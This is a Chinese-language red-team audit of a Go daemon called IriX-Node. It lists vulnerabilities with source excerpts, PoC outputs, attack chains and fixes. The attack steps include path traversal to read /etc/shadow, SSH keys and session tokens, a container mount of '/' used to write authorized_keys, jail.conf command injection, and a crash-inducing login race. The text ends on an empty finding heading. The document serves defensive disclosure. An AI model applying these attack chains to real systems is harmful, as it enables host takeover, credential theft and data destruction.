# IriX-Node 红队审计报告

- 目标：`D:\IriX-Node`（Go 1.25 模块 `irix/node`，节点守护进程，约 2 万行生产代码 + 1.5 万行测试）
- 版本基线：`main` @ `5fda84a`（Version 1.2.0）
- 审计方式：5 个专项小组并行静态审计（认证授权 / 文件存储 / 容器与命令执行 / 集群与网络 / 保险库），
  全部结论回源到源码；关键结论另外编写 PoC **实机运行验证**（Go 1.27 windows/amd64）。
- 证据标记：
  - `【已实测复现】` 本报告作者在本机跑通，附原始输出；
  - `【代码确认】` 逐行读源码确认，未做运行时验证（受平台/依赖限制）；
  - `【待确认】` 有明确机理但缺少运行环境验证。

---

## 0. 执行摘要

这是一个**把「节点级 root 能力」拆成 160 多个可独立开关的端点**的系统，而它的认证面本身存在
两个可以不依赖任何凭据/低权限即可打穿的问题：

| # | 严重度 | 问题 | 一句话影响 |
| --- | --- | --- | --- |
| 1 | 严重 | 未认证并发登录触发 Go 运行时 fatal error | **一条 curl 循环即可打挂整个节点**（未授权 DoS） |
| 2 | 严重 | 备份区 `uuid` 未校验 → 目录逃逸到文件系统根 | 低权限账户**读全盘任意文件**（含 accounts.db → 管理员会话 token）→ **完全接管** |
| 3 | 严重 | 实例 `cwd` 可指向数据目录 | 有实例+文件权限者读写删除 `accounts.db` / `vault.json` / `instances.json` |
| 4 | 严重 | FRP 二进制上传后**同请求内执行** | 一个 multipart 请求 = 以节点身份任意代码执行 |
| 5 | 严重 | `deleteFile:true` 对未校验的 `cwd` 执行 `RemoveAll` | 删除 `/home`、`/opt`、`/var` 等任意目录树（主机级数据破坏） |
| 6 | 高 | 审计日志 token 打码可绕过 + 请求体 `token` 未打码 | 管理员 30 天会话 token 明文落盘，被低权账户读走 |
| 7 | 高 | `%2F` 可进入 `r.PathValue` 且多处未净化 | dockerExport / Bastille 日志 / jail.conf 任意路径读写（root） |
| 8 | 高 | Redis 会话撤销链路多处缺口 | 登出/改密/删号后旧 token 仍有效 |
| 9 | 高 | 无实例级授权（IDOR） | 任一账户的文件/控制台权限覆盖**所有**实例 |
| 10 | 高 | 容器/Bastille/镜像构建权限 = 宿主机 root | bind mount `/`、任意 Dockerfile、jail.conf 注入 |
| 11 | 高 | 登录限速 fail-open + 账户锁定 DoS + 时序枚举 | 爆破防护可被关闭；管理员可被持续锁死 |
| 12 | 高 | 目录列举对每个文件全量 SHA-256（分页前） | 单请求即可吃满磁盘 IO/CPU（放大 DoS） |
| 13 | 高 | 保险库锁定态 `Save()` 明文写 `instances.json` | 静态加密承诺被自身破坏，泄露 startCommand 内凭据 |
| 14 | 高 | 任务表 `order`/`tasks` 不一致 + 后台 goroutine 无 recover | nil 解引用 panic 打挂进程 |
| 15 | 高 | 无 `ReadTimeout`/`WriteTimeout`，`/upload/` 无上限 | 未认证慢速连接 DoS / 磁盘写满 |
| 16 | 高 | `NormalizePath` 纯词法、不解析符号链接 | 文件 API 成为任意文件读写删 + 打包外泄通道 |
| 17 | 高 | 核心下载只校验声明的 `Content-Length` | chunked 响应绕过 8 GiB 上限，写满磁盘 |

**总体判断**：该项目的**网络层 SSRF 防护、路径越界防护意识、端点权限目录一致性**做得相当扎实
（详见 §8 已排除误报），但**信任边界有三处根本性缺陷**：

1. **`uuid`、`PathValue`、请求体里的路径/主机名等"看起来安全"的入参被当成可信**（#2、#7、#14）；
2. **数据目录 `{data}` 不在任何保护范围内**：它既可作为实例 `cwd`（#3），又在实例删除时被 `RemoveAll` 波及（#5），
   而账户库、保险库状态、TLS 私钥全在里面；
3. **权限模型只有"端点粒度"，没有"实例粒度"也没有"风险等级"**（#9、#10、#4），
   导致任何单个业务开关（下载备份、上传 FRP 客户端、创建容器）都等价于节点完全控制权。

---

## 1. 严重

### [严重-1] 未认证并发登录触发 Go 运行时致命错误，远程打挂整个守护进程 【已实测复现】

**位置**：`accounts.go:765-768`（缺锁）→ `accounts.go:772-779`（无锁迭代删除）→ `accounts.go:697-701`（调用链）
→ `accounts_handlers.go:144-153`（未认证入口）

```go
// accounts.go:765 —— 调用注释明确写着「调用方已持 loginMu」的无锁版本，但这里没有持锁
func (s *accountSystem) purgeLoginFails() {
	s.purgeLoginFailsLocked(time.Now())
}

// accounts.go:772
func (s *accountSystem) purgeLoginFailsLocked(now time.Time) {
	stale := now.Add(-(accountLoginWindow + accountLoginLockout))
	for k, e := range s.loginFails {   // ← 无锁遍历
		if e.windowSt.Before(stale) {
			delete(s.loginFails, k)     // ← 无锁删除
		}
	}
}
```

```go
// accounts.go:697
func (s *accountSystem) purgeExpiredSessions() {
	_, _ = s.db.Exec(rebindSQL(s.driver, `DELETE FROM sessions WHERE expires_at < ?`), time.Now().UnixMilli())
	s.purgeLoginFails()   // ← 每次登录都走这里
}
```

```go
// accounts_handlers.go:144（POST /api/auth/login，唯一无需认证的 /api 路由）
	ip := clientIP(r)
	if d.accounts.loginBlocked(body.Username, ip) { ... }
	d.accounts.purgeExpiredSessions()          // ← 无锁遍历开始
	...
	a, ok := d.accounts.checkPassword(body.Username, body.Password)
	if !ok {
		d.accounts.recordLoginFailure(body.Username, ip)   // ← 另一请求持 loginMu 写同一 map
```

`recordLoginFailure`（`accounts.go:728-754`）在 `loginMu` 保护下写 `s.loginFails`，
而 `purgeLoginFails` 完全不持锁地迭代 + 删除同一 map。Go 运行时对 `hashWriting` 标志的检测覆盖**整个迭代过程**，
所以这是宽窗口而非瞬时竞态。`fatal error` **不可 recover**，进程立即终止。

**实测输出**（`go test -run TestRedTeamLoginFailMapRace`，PoC 见 `zz_redteam_poc_test.go`）：

```
fatal error: concurrent map iteration and map write

goroutine 10 [running]:
internal/runtime/maps.(*Iter).Next(0x3bb27f8d62a0?)
irix/node.(*accountSystem).purgeLoginFailsLocked(0x3bb27f8a7d80, {0x0?, 0x0?, 0x7ff739763380?})
	D:/IriX-Node/accounts.go:774 +0x9d
irix/node.(*accountSystem).purgeLoginFails(0x3bb27f8a7d80)
	D:/IriX-Node/accounts.go:767 +0x2b
```

**攻击链**：无需任何凭据。并发发多个 `POST /api/auth/login`（用户名任意，密码错更好——失败路径写 map）。
放大手法：先用约 1 万个**不存在**的用户名做失败登录（`checkPassword` 对不存在的账户在 SQL 未命中处直接返回、
**不执行 bcrypt**，`accounts.go:406-412`，每次请求几微秒级）把 `loginFails` 撑到上限 `accountLoginMaxKeys=10000`，
之后无锁迭代的耗时可延长到毫秒级，两请求重叠概率极高。

**影响**：整个节点进程死亡。因为 `fatal error` 绕过 `main` 的 defer，**不会**走 `StopAll` 优雅关停
（`app_runtime.go:145`），所有游戏服务端成为孤儿进程，也不会执行 `FlushDirty`（未落盘的实例配置变更丢失）。

**修复**：

```go
func (s *accountSystem) purgeLoginFails() {
	s.loginMu.Lock()
	defer s.loginMu.Unlock()
	s.purgeLoginFailsLocked(time.Now())
}
```
并补 `-race` 并发回归测试（现有 `qa_accounts_test.go` 未覆盖该路径）。

---

### [严重-2] 备份区 `uuid` 未校验 → 逃逸到文件系统根：任意文件读取（→ 管理员接管）与任意文件删除 【已实测复现】

**位置**：`backup.go:33-35`（拼接）、`backup.go:279-334`（列举）、`backup.go:338-364`（删除）、`backup.go:369-409`（下载票据）

```go
// backup.go:33 —— uuid 直接进 Join，无实例存在性校验、无格式校验
func (d *Daemon) backupsDirOf(uuid string) string {
	return filepath.Join(d.DataDir, "backups", uuid)
}
```

```go
// backup.go:351 —— 删除：只做 pathWithin(dir, abs)，而 dir 已被 uuid 拉到任意目录
	dir := d.backupsDirOf(uuid)
	for _, p := range body.Paths {
		abs, err := filepath.Abs(p)
		if err != nil || !pathWithin(dir, abs) {
			writeError(w, http.StatusBadRequest, "备份路径越界: "+p)
			return
		}
		if err := os.Remove(abs); err != nil && !os.IsNotExist(err) { ... }
```

```go
// backup.go:391 —— 下载票据：同样只做 pathWithin(dir, abs)
	dir := d.backupsDirOf(uuid)
	if !pathWithin(dir, abs) { writeError(w, http.StatusBadRequest, "备份文件不在本实例备份区"); return }
	...
	password := tickets.CreateDownload(uuid, dir, abs)   // → /download/{password}/... 可读该文件
```

`filepath.Join` 会**规范化 `..`**，所以 `uuid=..` 让 `dir` 变成 `{data}`，`uuid` 给足层数就一路走到卷根/`/`。
`pathWithin("/", "/etc/shadow")` 为 `true`（`filepath.Rel("/", "/etc/shadow") == "etc/shadow"`），
于是**校验形同不存在**。

**实测输出 1 —— 作用域放大到整个文件系统**：

```
解析到卷根的 uuid = "..\..\..\..\..\..\..\.." → backupsDirOf = "C:\"（卷根 = "C:\"）
[越界票据] C:\Windows\win.ini → HTTP 200，票据="fe301719-..."
[已验证] 卷根外文件读取：HTTP 200，92 字节，首行="; for 16-bit app support"
[列举] 卷根 *.zip 列举 → HTTP 200（58 字节）
```

Linux 部署（数据目录 `/var/lib/irix-node`）`uuid=../../../..` 即到 `/`，
可读 `/etc/shadow`、`/root/.ssh/id_rsa`、`/root/.ssh/authorized_keys`；`DELETE` 走同一个 `pathWithin`，
可用同一 uuid 删除这些文件（数据破坏 / 反取证 / 提权铺垫）。

**实测输出 2 —— 完整提权链（低权限账户 → 管理员）**：

```
低权限账户 low-priv 已登录（token 长度 64）
[基线] 低权限账户 GET /api/accounts → HTTP 403          ← 确认它确实没有账户管理权限
[越界票据] 低权限账户拿到 accounts.db 的下载票据（HTTP 200）
[越界读取] /download/{票据}/accounts.db → HTTP 200，4096 字节
[越界票据] 低权限账户拿到 accounts.db-wal 的下载票据（HTTP 200）
[越界读取] /download/{票据}/accounts.db-wal → HTTP 200，86552 字节
[已验证] 从数据目录文件里复原出管理员会话 token: test-key
[提权成功] 用复原的管理员 token 读账户列表 → HTTP 200，响应 228 字节
```

低权限账户只需被授予**一个**端点开关 `POST /api/instance/backups/download`（权限组「实例」），
即可：申请越界票据 → 经免认证直连通道 `/download/{password}/...` 取回 `accounts.db` + `accounts.db-wal`
（`sessions.token` 是**明文主键**，`accounts.go:280-286`）→ 复原任意账户（含管理员）的 30 天会话 token
→ **完全接管节点**。整个过程不需要实例存在，也不需要管理员身份。

**修复**：
1. `backupsDirOf` 增加 `uuid` 白名单（`^[0-9a-f-]{36}$`）与实例存在性校验；
2. 所有备份端点改用「查询实例 → 取实例记录中的 uuid」而非请求参数；
3. 删除/下载端点增加 `pathWithin(d.backupsDirOf(realUUID), abs)` 前的 `EvalSymlinks` 与 `{data}/backups` 前缀双重校验；
4. 票据一律绑定单文件（见 [中-9]）。

---

### [严重-3] 实例 `cwd` 可以指向数据目录 → 文件 API 对账户库/保险库/实例表全量读写删 【已实测复现】

**位置**：`main.go:568-579`（黑名单不含 `DataDir`）、`main.go:583-623`（`validateCwd`）、`files.go:204/252-262/327`

```go
// main.go:568 —— 黑名单里没有 DataDir，实例 cwd 允许落在数据目录
func forbiddenCwdDirs() []string {
	if runtime.GOOS == "windows" {
		return []string{`\Windows`, `\Program Files`, `\Program Files (x86)`,
			`\ProgramData`, `\Users`, `\System Volume Information`, `\$Recycle.Bin`}
	}
	return []string{"/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64", "/lib32",
		"/boot", "/dev", "/proc", "/sys", "/var/log", "/var/run", "/root"}
}
```

**实测输出**：

```
[建实例] cwd=C:\...\Temp\TestRedTeamDataDirAsInstanceCwd...\001 → HTTP 200 uuid=af48c4fb-...
[读 /accounts.db]     HTTP 200，读出 24517 字节（响应体以 "SQLite format 3\u0000..." 开头）
[读 /accounts.db-wal] HTTP 200，读出 86552 字节
[写 vault.json] HTTP 200，落盘="{\"pwned\":1}"
[删 instances.json] HTTP 200，文件仍存在=false
[删 accounts.db] HTTP 500（Windows 文件占用；Linux 上 unlink 会成功 → 账户库被清空）
```

**影响**：
- 读 `accounts.db` / `accounts.db-wal` → 全部账户 bcrypt 哈希 + **所有会话 token 明文** → 接管；
- 读 `tls/*.key`（`-tls-mode auto/manual` 的私钥）→ 冒充节点、解密历史流量（若会话密钥可恢复）；
- 读 `config.json` → 数据库/Redis 口令；
- 写/删 `instances.json`、`vault/vault.json`、`vault/objects/*`、`logs/audit.log` → 配置投毒、保险库毁库、审计灭迹；
- 配合 `vaultFiles` 加密实例，可读写保险库密文对象。

**修复**：`validateCwd` 增加「解析后不得位于 `d.DataDir` 之内（含相等）」；`Load()` 时对 `instances.json` 里的
`cwd` 重新执行 `validateCwd`（当前 `Load` 只做 `filepath.Abs`，见 `daemon.go:344-352`，是一条**未校验的持久化信任边界**）；
数据目录显式 `0o700`。

---

### [严重-4] FRP 二进制上传后**在同一请求内被执行** → 单请求任意代码执行 【代码确认】

**位置**：`frp.go:448-504`（上传）、`frp.go:500-503`（执行点）、`frp.go:83-91`（执行函数）

```go
// frp.go:470 —— 文件名固定、内容零校验、非 Windows 直接置 0755
	name := "frpc"
	if runtime.GOOS == "windows" {
		name = "frpc.exe"
	}
	dest := filepath.Join(d.frpDir(), name)
	...
	if runtime.GOOS != "windows" {
		_ = os.Chmod(tmp, 0o755)
	}
	if err := os.Rename(tmp, dest); err != nil { ... }
	writeOK(w, map[string]any{
		"path":    dest,
		"version": frpcVersion(dest),   // ← 上传完成的同一请求里执行刚上传的文件
	})
```

```go
// frp.go:83
func frpcVersion(path string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, path, "-v").Output()   // ← 以节点身份执行
```

**攻击链**：普通账户被授予「上传 FRP 客户端」开关 → `POST /api/frp/binary`（multipart，任意 ELF/PE/脚本）
→ 服务端 `chmod 0755` 落盘 → **同请求内 `exec` 执行**。后续 `POST /api/frp/tunnels/{id}/start`
（`frp.go:195-213`）会反复执行同一文件。无需等待、无需交互。

**影响**：以节点进程身份任意代码执行。systemd 默认用户 root 的部署（`scripts/install-systemd.sh`）即宿主机 root。
上传还会**覆盖**原本合法的 `frpc`，破坏既有隧道。

**修复**：上传后禁止执行（版本探测改为读文件头/`--version` 前先校验 SHA-256 白名单或签名）；
该端点提升为 `requireAdmin`（与 `handleArchiveCreate/Restore` 一致）；落盘目录 `0o700`、文件名随机化。

---

### [严重-5] `deleteFile:true` 对未经校验的 `cwd` 执行 `os.RemoveAll` → 主机级数据破坏 【已实测复现】

**位置**：`instance.go:406-423`（API）→ `daemon.go:559-561`（删除）

```go
// daemon.go:559
	if deleteFiles && cwd != "" {
		_ = os.RemoveAll(cwd)     // ← cwd 来自实例配置，Create/Update 时只过黑名单，Load 时完全不校验
	}
```

`validateCwd` 黑名单（`main.go:575-579`）**不含** `/home`、`/opt`、`/srv`、`/var`、`/tmp`、`/var/www`，
Windows 上不含 `D:\` 等非系统盘目录。因此把实例 `cwd` 指向这些目录再删除实例，
就会递归删除整棵树。

**实测输出**：

```
validateCwd("...\victim-home") → 放行（不在黑名单内）
[实例删除] HTTP 200 {"data":["a70aac8b-..."],...}；整棵 ...\victim-home 已消失=true（哨兵文件是否还在=false）
[已验证] cwd 被整树 os.RemoveAll：黑名单外的任意目录可被连根删除
```

**攻击链**：账户持「创建实例 + 删除实例」两个开关 → `POST /api/instance {cwd:"/home"}` → `DELETE /api/instance {"uuids":[...],"deleteFile":true}` → `/home` 全丢。
Linux 上 `cwd=/var`、`/opt`、`/srv`、`/var/www` 同理；Windows 上 `D:\Projects`、`D:\Backup` 同理。

**修复**：`RemoveAll` 前强制执行 `validateCwd(cwd)` **并且**拒绝位于 `{data}`、系统目录、挂载根、以及
「已存在且非空且非该实例创建」的目录；更稳妥的做法是只允许删除 `{data}/instances/<uuid>` 下的沙箱目录。

---

## 2. 高

### [高-1] 审计日志明文泄漏 30 天会话 token（打码可绕过 + 请求体字段未覆盖）【已实测复现】

**位置**：`audit.go:110-126`（查询串打码）、`audit.go:167-172`（字段掩码表）、`accounts_handlers.go:49-58`（认证侧取值）

```go
// audit.go:112 —— 按 & 手工切分 + 前缀匹配
	parts := strings.Split(raw, "&")
	for i, p := range parts {
		lower := strings.ToLower(p)
		if strings.HasPrefix(lower, "token=") { parts[i] = "token=***" } else if ...
	}
```

```go
// accounts_handlers.go:57 —— 认证侧走标准解析
	return strings.TrimSpace(r.URL.Query().Get("token"))
```

```go
// audit.go:169 —— 掩码表里没有 "token"
var vaultMaskFields = []string{
	`"password"`, `"newPassword"`, `"oldPassword"`,
	`"totp"`, `"signature"`, `"recoveryToken"`, `"sessionToken"`,
}
```

**实测输出（绕过 1：参数名百分号编码）**：

```
url.ParseQuery("toke%6E=test-key") → token="test-key" err=<nil>     ← 认证侧解析成功
redactQuery("toke%6E=test-key") = "?toke%6E=test-key"               ← 打码未命中
[端到端] GET /api/overview?toke%6E=test-key → HTTP 200（认证通过=true）
```

即：攻击者/客户端用 `?toke%6E=<token>` 可以**正常认证**，而审计行会写下**明文 token**。

**绕过 2（请求体）**：`vaultMaskFields` 不含 `token`，所以：
- `POST /api/cluster/transfer` body `{"source":{"token":"<30 天会话 token>"}}`（`cluster.go:604`）
- `POST /api/frp/tunnels` body `{"config":{"token":"<FRP auth token>"}}`

都会把凭据明文写进 `{data}/logs/audit.log`（以及 stderr）。

**绕过 3（`;` 分隔）**：`?a=1;token=<token>` 不被打码（`Net/url` 会丢弃该段，认证不通过，但审计行照样原样落盘；
配合"诱导他人点击"可用于伪造/窃取记录）。

**影响链**：`GET /api/audit/log`（`audit.go:251-280`）是**独立权限开关**，管理员常把「查看审计日志」授予运维/客服账户。
该账户即可从日志里捞到管理员的会话 token（30 天有效、滑动续期）→ 以管理员身份操作。
同时 `tail=20000` 可一次导出 2 万行。

**修复**：`redactQuery` 改为基于 `url.ParseQuery` 的键遍历 + 对解析失败的原文做 `(?i)(^|[&;])token=[^&;]*` 正则兜底；
`vaultMaskFields` 增加 `"token"`、`"secret"`、`"key"`、`"authorization"` 并改为不区分大小写的键名匹配；
`/api/frp/tunnels`、`/api/cluster/*` 强制走掩码。

---

### [高-2] `%2F` 可进入 `r.PathValue`，多处路径拼接未净化 → 任意路径读写（root）【已实测复现（ServeMux 行为）+ 代码确认】

**实测输出（Go 1.27 ServeMux 行为判定）**：

```
path="/api/container/%2e%2e%2f%2e%2e%2fetc/export"  status=200 PathValue(id)="../../etc"
path="/api/container/..%2f..%2fetc/export"          status=200 PathValue(id)="../../etc"
path="/api/container/a%2Fb/export"                  status=200 PathValue(id)="a/b"
path="/api/container/../etc/export"                 status=307 PathValue(id)="<未命中处理器>"
```

结论：字面 `../` 会被 mux 归一化并 307 重定向，但 **`%2f`/`%2e%2e` 编码可以完整进入 `PathValue`**，
且值里可以带 `/`、`..`、换行。凡把 `PathValue` 直接拼进文件路径的处理器都存在穿越面：

| 位置 | 拼接点 | 后果 |
| --- | --- | --- |
| `container_docker.go:387-407` | `fileName := id + "-" + ms + ".tar"` → `os.Create` | root 在任意目录创建/截断文件（失败路径 `os.Remove`） |
| `container_bastille.go:1451-1465` / `1531-1553` | `filepath.Join(bastilleRoot,"run",name,session+".log")` | 读任意 `*.log`（如 `/var/log/auth.log`）、root 删除任意 `*.log` |
| `container_bastille.go:474-478` / `516-532` | `filepath.Join(bastilleRoot,"jails",name,"jail.conf")` | 读/受限覆盖宿主 `/etc/jail.conf` |
| `container_bastille.go:619-698` | `join(jailRoot(name), TrimPrefix(dst,"/"))` | `dst=..` 逃出 jail root，root 建目录 + 任意路径 mount |

**修复**：抽一个 `safeSeg(s, re)`（白名单正则 + 拒绝 `..`/分隔符/换行），所有 `PathValue` 进文件路径前必须过；
拼接后一律 `pathWithin(base, p)` 兜底。

---

### [高-3] 无实例级授权：任何账户的「文件/控制台/启停」权限覆盖全部实例（IDOR）【代码确认】

**证据**：所有实例相关处理器都只按 `uuid` 查实例，从不校验"该账户是否拥有这个实例"：

```go
// instance.go:250-260 —— requireInstance 只做存在性查找
func (d *Daemon) requireInstance(r *http.Request) (*Instance, error) {
	uuid := queryParam(r, "uuid")
	inst := d.Find(uuid)     // ← 无属主概念
```

`Daemon`/`Instance`/`account` 结构中**没有任何 owner/tenant 字段**（`daemon.go:112-131`、`accounts.go:66-72`），
`permAllowed`（`perm_catalog.go:73-79`）只按端点判定。

**具体后果**：
- 只被授予「列出文件 / 读写文件内容」的账户 → 可对**任意实例**的 `cwd` 读写删（跨租户）；
- 被授予「实时控制台」的账户 → `console_ws.go:144-158` 直接 `p.WriteCommand(msg)`，
  **不再判定** `GET /api/protected_instance/command` 这个独立开关 → 等于把"只读控制台"升级为"向任意实例下发任意 stdin 命令"；
- 被授予「启停/强杀/删除实例」的账户 → 对**任意实例**生效；
- 结合 [严重-3]（cwd=数据目录）与 [严重-5]（RemoveAll），跨实例权限直接变成主机级破坏。

**修复**：引入实例属主/租户模型（`Instance.Owner`），`requireInstance` 改为 `requireInstanceAccess(r, id)`；
`console_ws.go` 的每条文本帧按 `GET /api/protected_instance/command` 权限键二次判定（管理员旁路）。

---

### [高-4] 容器 / Bastille / 镜像构建权限 = 宿主机 root（权限面板误导性极强）【代码确认】

```go
// container_docker.go:114-131 —— volumes/env 零校验直接进 docker run -v/-e
	for _, v := range volumes {
		if strings.TrimSpace(v) != "" {
			args = append(args, "-v", v)
		}
	}
	for k, v := range env {
		args = append(args, "-e", k+"="+v)
	}
```

```go
// container_docker.go:184-186 —— 容器内执行经 sh -c
	return cliRun(cliTimeout, "docker", "exec", id, "sh", "-c", command)
```

```go
// container_docker.go:277-296 —— 镜像构建接受任意 Dockerfile，构建上下文写在数据目录
	if err := os.WriteFile(filepath.Join(dir, "Dockerfile"), []byte(dockerfile), 0o644); err != nil { ... }
	go runLongJob(jobID, "docker", "build", "-t", tagArg, "-f", "Dockerfile", dir)
```

```go
// container_bastille.go:417-424 —— mac 未转义写进 jail.conf（换行可闭合 { } 块）
	replacement := fmt.Sprintf(`vnet.interface = { name "%s"; mac "%s"; };`, iface, mac)
```

**攻击链**：
1. `POST /api/container/create {"image":"alpine","volumes":["/:/host"],"command":"sleep infinity"}`
   → start → `POST /api/container/{id}/exec {"command":"..."}` → 在容器内以 root 写 `/host/etc/cron.d/`、
   `/host/root/.ssh/authorized_keys` → **宿主机 root**；
2. `POST /api/image/build` 提交 `RUN --mount=type=bind,source=/,target=/host cat /host/etc/shadow`
   （BuildKit）→ 宿主文件进入镜像层；
3. `POST /api/bastille/jails/create`（FreeBSD）body 的 `mac` 携带 `\n}` + `exec.prestart = "..."`
   → 写入 `jail.conf` 顶层指令 → `jail(8)` 以 **宿主机 root** 执行 `exec.prestart`；
   `workdir` 只转义单引号、不处理换行（`container_bastille.go:727-736`），同类注入。

**修复**：`volumes` 白名单（仅允许 `{data}` 下路径，拒绝系统路径与符号链接）、`env` 拒绝 `LD_*`；
镜像构建端点收归管理员并禁用 BuildKit bind mount；`mac` 用
`^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$` 校验、`workdir` 拒绝 `\r\n'` 且必须绝对路径；
**在权限目录中把这些端点标注为"等价宿主机 root"**，默认仅管理员可见。

---

### [高-5] 登录防爆破体系整体失效（fail-open + 锁定 DoS + 时序枚举）【已实测复现 + 代码确认】

**(a) 表满即 fail-open**（`accounts.go:736-742`）：

```go
	if len(s.loginFails) >= accountLoginMaxKeys {
		s.purgeLoginFailsLocked(now)
		if len(s.loginFails) >= accountLoginMaxKeys {
			return // 仍满则丢弃本次计数（安全侧：拒绝服务而非放行）
		}
	}
```

注释写"拒绝服务而非放行"，实现却是**既不计数也不锁定**。

**实测输出**：

```
限速表条目数 = 10000（上限 10000）
表满后 victim 连续 20 次失败 → loginBlocked=false
[已验证] 限速 fail-open：登录爆破防护被完全关闭
```

攻击者用约 1 万个不存在的用户名（无 bcrypt 开销）常驻撑满表，此后对目标账户可**无限次在线猜口令**
（只受 bcrypt 速率限制），且 `IP` 维度键在同一循环里一起被跳过。

**(b) 账户锁定可被未认证者用于 DoS**（`accounts.go:713-724`）：用户名维度是**全局**键，
任意人对已知/枚举出的管理员用户名连发 5 次错误口令即锁定 15 分钟，可无限续期 → 管理员长期无法登录。
反向代理/NAT 之后，5 次失败还会连带封禁整个出口 IP 上所有用户。

**(c) 用户名枚举时序侧信道**（`accounts.go:406-412`）：账户不存在时不执行 bcrypt 直接返回，
存在时执行 `bcrypt.CompareHashAndPassword`（cost 10，数十毫秒），响应时间差 1~2 个数量级。

**修复**：表满语义改为"继续计数并锁定"（LRU 淘汰而非放行）；锁定改为「账户+IP」组合或指数退避；
账户不存在时对固定 dummy hash 执行一次等代价 bcrypt。

---

### [高-6] 目录列举对每个文件做全量 SHA-256（分页之前）→ IO/CPU 放大 DoS 【已实测复现】

**位置**：`files.go:118-138`（`listDir` 里对每个条目算 `fileSHA256`，**再**分页）、`files.go:66-77`、`cluster.go:89-125`（`walkEntries`）

```go
	for _, e := range entries {
		...
		if info.IsDir() {
			item["sha256"] = ""
		} else {
			item["sha256"] = fileSHA256(full)   // ← 读取整个文件内容计算摘要
		}
```

**实测输出**：目录内 1 个 256 MiB 文件、`page_size=1` → 单请求耗时 **189 ms** 且完整读取 256 MiB。

**影响**：`GET /api/files/list` 是"查看目录"，却等价于"读取目录内所有文件全文"。
一个含数十 GB 世界存档的实例目录，每次列举都会把整目录读一遍（磁盘 IO 打满、页缓存被冲刷），
并发数次即可拖垮节点。`/api/instance/sync/list`、`/api/cluster/sync/list` 同样（`walkEntries` + `fileSHA256`），
且这两个端点只受集群/实例权限控制，可绕过「文件」权限组拿到实例完整文件树（含 sha256/mtime/size）。

**修复**：目录列表默认不算摘要（改为显式 `?hash=1` 或按需单独接口）；对总字节数设上限；
`/sync/list` 加条目上限 + 限速 + 纳入「文件」权限组。

---

### [高-7] 保险库锁定态 `Save()` 明文落盘 `instances.json`，破坏静态加密承诺 【代码确认】

**位置**：`daemon.go:391-404`、`vault.go:587-595`、`instance.go:748`、`app_runtime.go:140-147`

```go
// daemon.go:391
	if d.vaultActive() {          // ← 需要 masterKey != nil（即已解锁）
		... 加密写 ...
		return nil
	}
	tmp := d.instanceFile() + ".tmp"     // ← 锁定态落到这里：明文 0644
	f, err := os.OpenFile(tmp, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o644)
```

```go
// vault.go:587 —— vaultActive 依赖 masterKey != nil
	return v.initialized && v.masterKey != nil && v.migration != nil && v.migration.InstancesDone
```

```go
// instance.go:748 —— stopAll 无条件 Save（优雅关停必经）
	if err := d.Save(); err != nil { errs = append(errs, ...) }
```

**路径**：解锁 → 空闲 30 分钟自动锁定 或 `POST /api/vault/lock`（`masterKey` 清零，
但 `d.Instances` 仍在内存）→ 收到 SIGTERM / systemd restart → `stopAll()` → `Save()` → **明文
`{data}/instances.json`（0644）**。该文件一直保留到下次成功解锁才被删除（`vault_migrate.go:170-186`）。
异步落盘循环（`daemon.go:454-473`）在锁定窗口内同样会写明文。

**影响**：`startCommand` 常含 RCON/数据库口令、token 参数；`cwd`、`EventTask` 等一并泄露。
设计声称 instances.json"始终加密"，此处是**实现偏离设计**而非"接受的残余风险"。

**修复**：`vault.enabled && initialized` 但未解锁时，`Save()` 拒绝明文写（保留脏标记，解锁后写加密对象）；
`stopAll` 在该状态下只做 `store.flush()`。

---

### [高-8] 任务表 `order`/`tasks` 不一致 → nil 解引用 panic；后台 goroutine 无 recover → 节点进程退出 【代码确认】

**位置**：`jobs.go:96-121`、`jobs.go:140-157`、`daemon_lifecycle.go:50-59`

```go
// jobs.go:108 —— 过期回收只删 tasks，order 里留下悬挂 id
			if expired {
				delete(s.tasks, id)
				break
			}
```

```go
// jobs.go:143 —— 后续遍历 order 时 t 可能为 nil
	keep := s.order[:0]
	for _, id := range s.order {
		t := s.tasks[id]
		t.mu.Lock()          // ← nil 解引用 panic
```

```go
// daemon_lifecycle.go:50 —— 后台 goroutine 无 recover
	go func() {
		defer b.gate.leave()
		run(b.ctx)
	}()
```

**触发路径**：任意可建任务的权限（如 `POST /api/runtime/java/install`，`jdk_install.go:54-56` 无条件 `d.newTask()`）
→ 打满 `maxTasks=1024` → 等过 `taskTTL`（2h）→ 再建任务命中 expired 分支 → 第 3 次建任务或 ≤10 分钟后的
`tasks.cleanupLoop`（`app_runtime.go:54`）在 nil 上 panic → **整个节点进程退出**（全实例中断）。

**修复**：expired 分支同步从 `s.order` 移除；循环内 `if t == nil { continue }`；
`backgroundWorkers.start` 与所有 `go runLongJob`/watchdog 加 `recover()` + 日志。

---

### [高-9] 未设置读/写超时，`/upload/` 无 body 上限与时限 → 未认证慢速 DoS 【代码确认】

**位置**：`http_server.go:12-19`、`main.go:481-488`

```go
	return &http.Server{
		Addr:    addr,
		Handler: d.trackRequests(d.auditMiddleware(corsMiddleware(d.vaultGate(limitAPIBody(mux))))),
		ReadHeaderTimeout: 10 * time.Second,
		IdleTimeout:       60 * time.Second,
		MaxHeaderBytes:    64 << 10,
		// 无 ReadTimeout / WriteTimeout
	}
```

```go
		if r.Body != nil && strings.HasPrefix(r.URL.Path, "/api/") {
			r.Body = http.MaxBytesReader(w, r.Body, maxAPIBodyBytes)   // /upload/ 不受限
		}
```

**攻击面**：`POST /api/auth/login` 与 `POST /upload/{ticket}` 都是**免认证**入口。
攻击者发送 `Content-Length: 16777216` 后每 30 秒发 1 字节即可长期占住连接与 goroutine；
`/upload/` 连 body 上限都没有，且 `ParseMultipartForm(32<<20)` 之前没有任何整体时限。
项目自己在 `main.go:384-388` 主动把 fd 上限拉到硬上限，进一步放大（fd 耗尽 → 合法用户 connection refused）。
`qa_security_test.go:1119-1132` 明确断言"不应设置 ReadTimeout/WriteTimeout"（为大文件让路），
但对免认证入口缺少任何独立兜底。

**修复**：对 `/upload/`、`/download/` 用独立 `http.TimeoutHandler` 或"读空闲超时"（每次成功读后
`SetReadDeadline` 顺延）；对 `/api/` 增设 `ReadTimeout`（如 60s）；对免认证入口加并发/速率限制。

---

### [高-10] 符号链接穿透 `cwd` 边界：文件 API 变成"节点可访问任意文件"的读写删与打包通道 【代码确认 + 已有测试佐证】

